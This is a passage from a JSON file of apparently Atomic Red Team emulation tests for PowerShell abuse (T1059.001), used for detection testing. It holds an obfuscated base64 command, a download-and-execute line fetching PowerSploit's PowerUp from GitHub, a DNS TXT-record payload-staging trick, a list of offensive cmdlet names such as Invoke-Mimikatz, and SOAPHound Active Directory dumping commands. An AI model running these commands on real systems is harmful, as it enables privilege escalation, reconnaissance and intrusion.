                            "windows"
                        ],
                        "input_arguments": {
                            "command_line_switch_type": {
                                "description": "The type of supported command-line switch to use",
                                "type": "string",
                                "default": "Hyphen"
                            },
                            "encoded_command_param_variation": {
                                "description": "The \"EncodedCommand\" parameter variation to use",
                                "type": "string",
                                "default": "E"
                            }
                        },
                        "dependencies": [
                            {
                                "description": "The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.",
                                "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}",
                                "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
                            }
                        ],
                        "executor": {
                            "command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments",
                        "auto_generated_guid": "0d181431-ddf3-4826-8055-2dbf63ae848b",
                        "description": "Executes powershell.exe with variations of the -EncodedCommand parameter with encoded arguments supplied",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "encoded_command_param_variation": {
                                "description": "The \"EncodedCommand\" parameter variation to use",
                                "type": "string",
                                "default": "E"
                            },
                            "command_line_switch_type": {
                                "description": "The type of supported command-line switch to use",
                                "type": "string",
                                "default": "Hyphen"
                            },
                            "encoded_arguments_param_variation": {
                                "description": "The \"EncodedArguments\" parameter variation to use",
                                "type": "string",
                                "default": "EncodedArguments"
                            }
                        },
                        "dependencies": [
                            {
                                "description": "The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.",
                                "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}",
                                "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
                            }
                        ],
                        "executor": {
                            "command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "PowerShell Command Execution",
                        "auto_generated_guid": "a538de64-1c74-46ed-aa60-b995ed302598",
                        "description": "Use of obfuscated PowerShell to execute an arbitrary command; outputs \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "obfuscated_code": {
                                "description": "Defaults to: Invoke-Expression with a \"Write-Host\" line.",
                                "type": "string",
                                "default": "JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA=="
                            }
                        },
                        "executor": {
                            "command": "powershell.exe -e  #{obfuscated_code}\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "PowerShell Invoke Known Malicious Cmdlets",
                        "auto_generated_guid": "49eb9404-5e0f-4031-a179-b40f7be385e3",
                        "description": "Powershell execution of known Malicious PowerShell Cmdlets",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "Malicious_cmdlets": {
                                "description": "Known Malicious Cmdlets",
                                "type": "string",
                                "default": "\"Add-Persistence\", \"Find-AVSignature\", \"Get-GPPAutologon\", \"Get-GPPPassword\", \"Get-HttpStatus\", \"Get-Keystrokes\", \"Get-SecurityPackages\", \"Get-TimedScreenshot\", \"Get-VaultCredential\", \"Get-VolumeShadowCopy\", \"Install-SSP\", \"Invoke-CredentialInjection\", \"Invoke-DllInjection\", \"Invoke-Mimikatz\", \"Invoke-NinjaCopy\", \"Invoke-Portscan\", \"Invoke-ReflectivePEInjection\", \"Invoke-ReverseDnsLookup\", \"Invoke-Shellcode\", \"Invoke-TokenManipulation\", \"Invoke-WmiCommand\", \"Mount-VolumeShadowCopy\", \"New-ElevatedPersistenceOption\", \"New-UserPersistenceOption\", \"New-VolumeShadowCopy\", \"Out-CompressedDll\", \"Out-EncodedCommand\", \"Out-EncryptedScript\", \"Out-Minidump\", \"PowerUp\", \"PowerView\", \"Remove-Comments\", \"Remove-VolumeShadowCopy\", \"Set-CriticalProcess\", \"Set-MasterBootRecord\"\n"
                            }
                        },
                        "executor": {
                            "name": "powershell",
                            "elevation_required": true,
                            "command": "$malcmdlets = #{Malicious_cmdlets}\nforeach ($cmdlets in $malcmdlets) {\n    \"function $cmdlets { Write-Host Pretending to invoke $cmdlets }\"}\nforeach ($cmdlets in $malcmdlets) {\n    $cmdlets}\n"
                        }
                    },
                    {
                        "name": "PowerUp Invoke-AllChecks",
                        "auto_generated_guid": "1289f78d-22d2-4590-ac76-166737e1811b",
                        "description": "Check for privilege escalation paths using PowerUp from PowerShellMafia\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)\nInvoke-AllChecks\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Abuse Nslookup with DNS Records",
                        "auto_generated_guid": "999bff6d-dc15-44c9-9f5c-e1051bfc86e1",
                        "description": "Red teamer's avoid IEX and Invoke-WebRequest in your PowerShell commands. Instead, host a text record with a payload to compromise hosts.\n[reference](https://twitter.com/jstrosch/status/1237382986557001729)\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "# creating a custom nslookup function that will indeed call nslookup but forces the result to be \"whoami\"\n# this would not be part of a real attack but helpful for this simulation\nfunction nslookup  { &\"$env:windir\\system32\\nslookup.exe\" @args | Out-Null; @(\"\",\"whoami\")}\npowershell .(nslookup -q=txt example.com 8.8.8.8)[-1]\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "SOAPHound - Dump BloodHound Data",
                        "auto_generated_guid": "6a5b2a50-d037-4879-bf01-43d4d6cbf73f",
                        "description": "Dump BloodHound data using SOAPHound. Upon execution, BloodHound data will be dumped and stored in the specified output directory.\nsrc: https://github.com/FalconForceTeam/SOAPHound\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "user": {
                                "description": "Username for authentication",
                                "type": "string",
                                "default": "$env:USERNAME"
                            },
                            "password": {
                                "description": "Password for authentication",
                                "type": "string",
                                "default": "P@ssword1"
                            },
                            "domain": {
                                "description": "Domain for authentication",
                                "type": "string",
                                "default": "$env:USERDOMAIN"
                            },
                            "dc": {
                                "description": "Domain Controller IP",
                                "type": "string",
                                "default": "10.0.1.14"
                            },
                            "cachefilename": {
                                "description": "Cache filename",
                                "type": "string",
                                "default": "c:\\temp\\cache.txt"
                            },
                            "outputdirectory": {
                                "description": "Output directory",
                                "type": "string",
                                "default": "c:\\temp\\test2"
                            },
                            "soaphound_path": {
                                "description": "Path to SOAPHound binary",
                                "type": "string",
                                "default": "PathToAtomicsFolder\\T1059.001\\bin\\SOAPHound.exe"
                            }
                        },
                        "executor": {
                            "command": "#{soaphound_path} --user #{user} --password #{password} --domain #{domain} --dc #{dc} --bhdump --cachefilename #{cachefilename} --outputdirectory #{outputdirectory}\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "SOAPHound - Build Cache",
                        "auto_generated_guid": "4099086c-1470-4223-8085-8186e1ed5948",
                        "description": "Build cache using SOAPHound. Upon execution, a cache will be built and stored in the specified cache filename.\nsrc: https://github.com/FalconForceTeam/SOAPHound\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "user": {
                                "description": "Username for authentication",
                                "type": "string",
                                "default": "$env:USERNAME"
                            },
                            "password": {
                                "description": "Password for authentication",
                                "type": "string",
                                "default": "P@ssword1"
                            },
                            "domain": {
                                "description": "Domain for authentication",
                                "type": "string",
                                "default": "$env:USERDOMAIN"
                            },
                            "dc": {
                                "description": "Domain Controller IP",
                                "type": "string",
                                "default": "10.0.1.14"
                            },
                            "cachefilename": {
                                "description": "Cache filename",
                                "type": "string",
                                "default": "c:\\temp\\cache.txt"
                            },
                            "soaphound_path": {
                                "description": "Path to SOAPHound binary",
                                "type": "string",
                                "default": "PathToAtomicsFolder\\T1059.001\\bin\\SOAPHound.exe"
                            }
                        },
                        "executor": {
                            "command": "#{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}\n",
                            "name": "powershell"
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 12:02:59"
}